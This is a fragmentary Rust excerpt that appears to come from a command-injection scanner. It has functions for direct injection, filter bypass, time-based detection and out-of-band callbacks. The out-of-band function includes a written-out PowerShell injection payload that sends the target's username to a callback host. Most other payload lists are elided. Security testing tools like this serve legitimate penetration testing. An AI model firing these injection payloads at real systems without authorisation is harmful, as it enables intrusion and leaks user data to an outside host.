...
pub async fn os_inject(
        ...
        if let Ok(resp) = client.get(&test_url).send().await {
            ...
            for marker in OS_MARKERS {
                if body.contains(marker) {
                    println!(
                        "{} [CRITICAL] Command injection confirmed!",
                        "[!]".red().bold()
                    );
    ...
    if !found {
        println!(
            "{} No direct command injection detected.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
...
pub async fn filter_bypass(
    ...
    for payload in FILTER_BYPASS {
        ...
        if let Ok(resp) = client.get(&test_url).send().await {
            ...
            for marker in OS_MARKERS {
                if body.contains(marker) {
                    println!(
                        "{} [CRITICAL] Filter bypass successful!",
                        "[!]".red().bold()
                    );
                    println!("  {} Payload: {}", "•".cyan(), payload);
                    println!("  {} Marker:  {}", "•".cyan(), marker);
    ...
    if !found {
        println!(
            "{} No filter bypass payloads succeeded.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
...
pub async fn time_based(
    ...
    for (name, payload) in &payloads {
        ...
        if delayed {
            found = true;
            println!(
                "{} [HIGH] Time-based command injection via {}!",
                "[!]".red().bold(),
                name
            );
        }
    ...
    if !found {
        println!(
            "\n{} No time-based command injection detected.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
...
pub async fn oob(
    ...
    let payloads = [
        ...
        format!(
            "&powershell -c \"iwr http://{}/$env:USERNAME\"",
            callback_host
        ),
    ];
    ...
    println!(
        "\n{} Payloads sent. Monitor callback server for DNS/HTTP hits.",
        "[*]".cyan().bold()
    );
    Ok(())
}
